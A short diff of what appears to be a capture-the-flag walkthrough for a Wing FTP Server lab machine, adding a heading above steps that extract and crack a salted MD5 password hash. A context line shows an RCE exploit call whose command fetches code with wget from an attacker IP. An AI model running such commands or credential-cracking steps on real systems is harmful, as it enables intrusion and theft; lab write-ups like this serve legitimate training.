@@ -95,6 +95,8 @@ python3 rce.py -u "http://ftp.wingdata.htb/" -c "wget -O- http://10.10.15.133:80
 ```
 
 - 🔍 *This grants us initial access as the service user `wingftp`.*
+### wacky.xml Salted MD5 Credential Extraction & Hash Cracking
+
 - 🔍 *While enumerating the system, we locate the user database file for the server at `/opt/wftpserver/Data/1/users/wacky.xml`.*
 - 🔍 *We read `wacky.xml` and extract the salted MD5 password hash for the user `wacky`.*
 - 🔍 *Using John the Ripper or Hashcat, we crack the hash using the known static salt "WingFTP" to recover wacky's plaintext credentials.*
